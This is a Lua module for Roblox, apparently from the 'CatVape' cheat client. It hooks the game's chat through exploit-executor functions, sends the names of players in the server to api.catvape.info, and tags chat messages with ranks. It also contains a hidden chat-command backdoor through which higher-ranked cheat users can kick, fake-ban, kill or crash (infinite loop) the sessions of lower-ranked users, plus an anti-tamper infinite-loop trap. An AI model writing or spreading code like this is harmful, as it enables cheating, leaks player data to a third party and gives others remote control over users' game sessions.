local serv = setmetatable({}, {
    __index = function(self, index)
        self[index] = cloneref(game:GetService(index))
        return self[index]
    end
})
local textchat = serv.TextChatService
local lplr = game.Players.LocalPlayer
local vape = shared.vape
local whitelistdata = setmetatable({
    whitelisted = {},
    selfrank = {
        lvl = 1,
        rank = 'User',
        color = {255, 255, 0}
    },
    tagcolors = {
        User = {255, 255, 0},
		Blacklisted = {0, 0, 0},
	    Whitelist = {235, 146, 52},
	    Private = {229, 52, 235},
	    Developer = {52, 235, 232},
	    Owner = {113, 52, 235}
    },
    players = {},
    lists = {
        User = 1,
	    Blacklisted = 2,
	    Whitelist = 3,
	    Private = 4,
	    Developer = 5,
	    Owner = 6
    }
}, {
    __newindex = function()
        while true do end
    end
})
local getRank = function(self, string)
    local request = request({
        Url = `https://api.catvape.info/auth/whitelist/getWhitelistData?name={self.Name}`,
        Method = 'GET'
    })
    local body = serv.HttpService:JSONDecode(request.Body)
    if body.Rank then
        for i,v in whitelistdata.lists do
            print(i, body.Rank)
            if body.Rank == i then
                return string and body.Rank or v
            end
        end
    end
end
whitelistdata.selfrank.lvl = getRank(lplr)
whitelistdata.selfrank.rank = getRank(lplr, true)
whitelistdata.selfrank.color = whitelistdata.tagcolors[whitelistdata.selfrank.rank]

local bulkplrs = {}
for i,v in serv.Players:GetPlayers() do
    if v ~= lplr then
        table.insert(bulkplrs, v.Name)
    end
end
local bulkrequest = request({
    Url = `https://api.catvape.info/auth/whitelist/getBulkWhitelistData?names={table.concat(bulkplrs, '//')}`,
    Method = 'GET'
})
whitelistdata.players = serv.HttpService:JSONDecode(bulkrequest.Body)

local chatrank = {}
if textchat.ChatVersion == Enum.ChatVersion.TextChatService then
    textchat.OnIncomingMessage = function(message)
        local properties = Instance.new('TextChatMessageProperties')
        if message.TextSource then
            local plr = serv.Players:GetPlayerByUserId(message.TextSource.UserId)
            if table.find(whitelistdata.whitelisted, plr.UserId) or plr == lplr then
                local plrrank = chatrank[plr.Name] or nil
                if not plrrank then
                    chatrank[plr.Name] = getRank(plr, true)
                    plrrank = chatrank[plr.Name]
                end
                local tagcolor = whitelistdata.tagcolors[plrrank]
                properties.PrefixText = `<font color='rgb({table.concat(tagcolor, ', ')})'>[{plrrank:upper()}]</font> {message.PrefixText}`
            end
        end
        return properties
    end
else
    local func = function(func)
        local msgtable, oldchat = debug.getupvalue(func, 3)

		oldchat = hookfunction(func, function(data, ...)
			local plr = serv.Players:GetPlayerByUserId(data.SpeakerUserId)
			if table.find(whitelistdata.whitelisted, plr.UserId) or plr == lplr then
				data.ExtraData.Tags = data.ExtraData.Tags or {}
                local plrrank = chatrank[plr.Name] or nil
                if not plrrank then
                    chatrank[plr.Name] = getRank(plr, true)
                    plrrank = chatrank[plr.Name]
                end
                local tagcolor = whitelistdata.tagcolors[plrrank]
				table.insert(data.ExtraData.Tags, {TagText = plrrank, TagColor = Color3.fromRGB(unpack(tagcolor))})
			end
			return oldchat(data, ...)
		end)

		hookfunction(func, oldchat)
    end
    pcall(function()
        for _, v in getconnections(serv.ReplicatedStorage.DefaultChatSystemChatEvents.OnNewMessage.OnClientEvent) do
            if v.Function and table.find(debug.getconstants(v.Function), 'UpdateMessagePostedInChannel') then
                func(v.Function)
                break
            end
        end
    
        for _, v in getconnections(serv.ReplicatedStorage.DefaultChatSystemChatEvents.OnMessageDoneFiltering.OnClientEvent) do
            if v.Function and table.find(debug.getconstants(v.Function), 'UpdateMessageFiltered') then
                func(v.Function)
                break
            end
        end
    end)
end

local whitelistedPlayer = nil
local commands = {
    kick = function(arg1, arg2)
	    local request: table = request({
	        Url = `https://api.catvape.info/auth/whitelist/getWhitelistData?name={whitelistedPlayer.Name}`,
	        Method = 'GET'
	    });
	    local req: table = serv.HttpService:JSONDecode(request.Body)
	    lplr:Kick(`[{getRank(whitelistedPlayer, true):upper() or 'A CatVape User'}] {req and req.Rank and req.Username or ''} has kicked you from the experience, reason: {arg1 or none}`);
	end,
	bwban = function()
	    lplr:Kick('You have been temporarily banned.\n[Remaining ban duration: 4960 weeks 2 days 5 hours 19 minutes 59 seconds]')
	end,
	trip = function()
		lplr.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Ragdoll)
	end,
	kill = function(arg, arg2)
	    if vape.Libraries.entity.isAlive then
	        lplr.Character.Humanoid.Health = 0;
        end
	end,
	gravity = function(arg, arg2)
	    workspace.Gravity = arg or 196.2
	end,
	void = function()
		lplr.Character.HumanoidRootPart.CFrame = lplr.Character.HumanoidRootPart.CFrame + Vector3.new(0, -1000, 0)
	end,
	notify = function(arg, arg2)
	    vape:CreateNotification(arg or 'A CatVape User Messaged you', arg2 or 'Im in your game :)', 15, 'info');
	end,
	crash = function()
		local sgui = Instance.new('ScreenGui', game.CoreGui)
		local frame = Instance.new('Frame', sgui)
		frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		frame.Size = UDim2.new(-50, 5000, -50, 5000)
		task.delay(0.1, function()
            while true do end
        end)
	end
}

local addplayer = function(v)
    local plr = whitelistdata.players[v.Name]
    if plr and plr.Rank then
        if whitelistdata.lists[plr.Rank] < whitelistdata.selfrank.lvl then
            vape:CreateNotification('Cat', `{v.Name} is using cat v5!`, 20)
        elseif whitelistdata.lists[plr.Rank] > whitelistdata.selfrank.lvl then
            v.Chatted:Connect(function(message)
                table.insert(whitelistdata.whitelisted, plr.UserId)
                table.insert(whitelistdata.whitelisted, plr.Name)
                whitelistedPlayer = v
                local command = message:split(' ')[1]:split(';')[2] or nil;
                if command and commands[command] then
                    local args = message:split(' ');
                    if args[2] and (args[2]:lower() == getRank(lplr, true):lower() or args[2]:lower() == 'all') then
                        commands[command](args[3] or nil, args[4] or nil);
                    end;
                end;
            end)
        end
    end
end

for i,v in serv.Players:GetPlayers() do
    if v ~= lplr then
        addplayer(v)
    end
end

serv.Players.PlayerAdded:Connect(addplayer)
return whitelistdata